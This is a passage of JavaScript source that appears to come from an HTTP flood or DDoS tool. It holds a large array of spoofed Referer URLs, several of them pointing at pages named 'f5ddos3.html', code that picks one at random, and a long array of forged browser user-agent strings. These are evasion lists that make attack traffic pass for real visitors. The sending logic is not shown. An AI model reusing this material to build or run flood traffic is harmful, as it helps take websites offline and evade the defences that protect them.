    'http://jobs.bloomberg.com/search?q=',
    'http://jobs.leidos.com/search?q=',
    'http://jobs.rbs.com/jobs/search?q=',
    'http://king-hrdevil.rhcloud.com/f5ddos3.html?v=',
    'http://louis-ddosvn.rhcloud.com/f5.html?v=',
    'http://millercenter.org/search?q=',
    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=',
    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/',
    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=',
    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/',
    'http://page-xirusteam.rhcloud.com/f5ddos3.html?v=',
    'http://php-hrdevil.rhcloud.com/f5ddos3.html?v=',
    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x&q=',
    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x/',
    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf&q=',
    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf/',
    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=',
    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/',
    'http://search.aol.com/aol/search?q=',
    'http://taginfo.openstreetmap.org/search?q=',
    'http://techtv.mit.edu/search?q=',
    'http://validator.w3.org/feed/check.cgi?url=',
    'http://vk.com/profile.php?redirect=',
    'http://www.ask.com/web?q=',
    'http://www.baoxaydung.com.vn/news/vn/search&q=',
    'http://www.bestbuytheater.com/events/search?q=',
    'http://www.bing.com/search?q=',
    'http://www.evidence.nhs.uk/search?q=',
    'http://www.google.com/?q=',
    'http://www.google.com/translate?u=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e&q=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e/',
    'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
    'http://www.pagescoring.com/website-speed-test/?url=',
    'http://www.reddit.com/search?q=',
    'http://www.search.com/search?q=',
    'http://www.shodanhq.com/search?q=',
    'http://www.ted.com/search?q=',
    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
    'http://www.usatoday.com/search/results?q=',
    'http://www.ustream.tv/search?q=',
    'http://yandex.ru/yandsearch?text=',
    'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=',
    'http://ytmnd.com/search?q=',
    'https://add.my.yahoo.com/rss?url=',
    'https://careers.carolinashealthcare.org/search?q=',
    'https://check-host.net/',
    'https://developers.google.com/speed/pagespeed/insights/?url=',
    'https://drive.google.com/viewerng/viewer?url=',
    'https://duckduckgo.com/?q=',
    'https://google.com/',
    'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=',
    'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=',
    'https://help.baidu.com/searchResult?keywords=',
    'https://play.google.com/store/search?q=',
    'https://pornhub.com/',
    'https://r.search.yahoo.com/',
    'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
    'https://steamcommunity.com/market/search?q=',
    'https://vk.com/profile.php?redirect=',
    'https://www.bing.com/search?q=',
    'https://www.cia.gov/index.html',
    'https://www.facebook.com/',
    'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
    'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
    'https://www.fbi.com/',
    'https://www.google.ad/search?q=',
    'https://www.google.ae/search?q=',
    'https://www.google.al/search?q=',
    'https://www.google.co.ao/search?q=',
    'https://www.google.com.af/search?q=',
    'https://www.google.com.ag/search?q=',
    'https://www.google.com.ai/search?q=',
    'https://www.google.com/search?q=',
    'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=',
    'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=',
    'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=',
    'https://www.npmjs.com/search?q=',
    'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
    'https://www.pinterest.com/search/?q=',
    'https://www.qwant.com/search?q=',
    'https://www.ted.com/search?q=',
    'https://www.usatoday.com/search/results?q=',
    'https://www.yandex.com/yandsearch?text=',
    'https://www.youtube.com/',
    'https://yandex.ru/',
    'https://www.betvictor106.com/?jskey=BBOR1oulRNQaihu%2BdyW7xFyxxf0sxIMH%2BB%2FKe4qvs6S3u89h1BcavwQ%3D',

  ];
var randomReferer = refers[Math.floor(Math.random() * refers.length)];
let concu = sigalgs.join(':');

const uap = [
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; moto e(7) plus Build/QPZS30.30-Q3-38-69-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; JAT-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.0 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/217.0.454508427 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5115.170 Safari/537.36 Edg/101.0.1202.50",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.0 Safari/537.36 Edg/105.0.1296.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4881.178 Safari/537.36 Edg/98.0.1108.50",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5111.0 Safari/537.36 Edg/104.0.1290.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4881.196 Safari/537.36 Edg/95.0.1020.30",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/98.0.1108.62",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.0 Safari/537.36 Edg/104.0.1293.1",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.32",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.0 Safari/537.36 Edg/104.0.1293.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 Edg/102.0.1245.44",
"Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5098.136 Safari/537.36 Edg/99.0.1208.24",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Safari/537.36 Edg/102.0.1245.71",
"Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:107.0) Gecko/20110101 Firefox/107.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4; rv:107.0) Gecko/20110101 Firefox/107.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1; rv:106.0) Gecko/20000101 Firefox/106.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:106.0) Gecko/20012209 Firefox/106.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20110101 Firefox/100.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:100.0) Gecko/20061419 Firefox/100.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 12.4; rv:100.0) Gecko/20100101 Firefox/100.0",
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:100.0) Gecko/20000101 Firefox/100.0",
"Mozilla/5.0 (X11; Linux x86_64) Gecko/20162914 Firefox/100.0",
"Mozilla/5.0 (Macintosh; PPC Mac OS X x.y; rv:100.0) Gecko/20100101 Firefox/100.0",
"Mozilla/5.0 (Linux; Android 11; Mobile; rv: 100.0) Gecko/100.0 FireFox/100.0",
"Mozilla/5.0 (X11; U; Linux x86_64) Gecko/20000604 Firefox/100.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:100.0) Gecko/20071101 Firefox/100.0",
"Mozilla/5.0 (X11; Linux x86_64:100.0) Gecko/20100101 Firefox/100.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:100.0) Gecko/20012119 Firefox/100.0",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.91 Safari/537.36 OPR/44.0.2276.288",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.4126.146 Safari/537.36 OPR/54.0.4177.46",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.4123.146 Safari/537.36 OPR/53.0.4054.46",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4892.119 Safari/537.36 OPR/85.0.4341.72",
"Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5150.115 Safari/537.36 OPR/80.0.3637.162",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4870.168 Safari/537.36 OPR/78.0.3351.71",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36 OPR/85.0.4341.18",
"Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.5126.171 Safari/537.36 OPR/79.0.2378.171",
"Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5041.151 Safari/537.36 OPR/82.0.4117.142",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.58",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4930.0 Safari/537.36 OPR/83.0.4254.27",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/102.0.5005.61 Safari/537.36 OPR/88.0.4412.27",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4862.113 Safari/537.36 OPR/85.0.4341.60",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15 [ip:87.10.225.10]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.163.73]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.205.123]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.182.120]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.216.36]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.209.127]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:82.51.25.66]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.183.139]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.204.153]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.211.83]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:87.18.55.5]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:87.6.61.173]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.202.253]",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
"Mozilla/5.0 (iPad; CPU OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4.1 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML%2C like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
"Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML%2C like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15H321 Safari/604.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.41",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.8.26",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15 BingSapphire/1.0.400518001",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4.1 Mobile/15E148 Safari/605.1.15 BingSapphire/1.0.400518001",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4.1 Mobile/15E148 Safari/605.1.15 BingSapphire/1.0.391216004",
"Mozilla/5.0 (iPad; CPU OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4.1 Mobile/15E148 Safari/605.1.15 BingSapphire/1.0.400511001",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
"Mozilla/5.0 (iPad; CPU OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4.1 Mobile/15E148 Safari/605.1.15 NewsSapphire/1.0.400420001",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4.1 Mobile/15E148 Safari/605.1.15 BingSapphire/1.0.400511001",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 GLS/93.10.1819.20",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.134 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 OpenWave/96.4.1823.24",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5022.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5022.0 Safari/537.36",
"Mozilla/5.0 (X11; CrOS x86_64 14927.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; STK-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-S767VL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-G986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; KFMAWI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (X11; CrOS x86_64 14917.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5116.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5118.3 Safari/537.36",
"Mozilla/5.0 (X11; CrOS x86_64 14885.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5117.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5116.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5115.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5114.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5113.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5113.0 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5113.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4896.127 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5022.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4844.51 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4844.51 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G531H) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; Redmi Note 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A305G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G930F/G930FXXU5ESD2) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; fr-fr; SAMSUNG SM-T520 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/82.0.140 Chrome/76.0.3809.140 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/82.0.140 Chrome/76.0.3809.140 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18898",
"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (X11; Linux i686 (x86_64)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; KOB-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-G610M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (X11; CrOS armv7l 9592.82.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.2; SM-G955N Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J120H) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.30729; .NET CLR 3.5.30729)",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 DuckDuckGo/7",
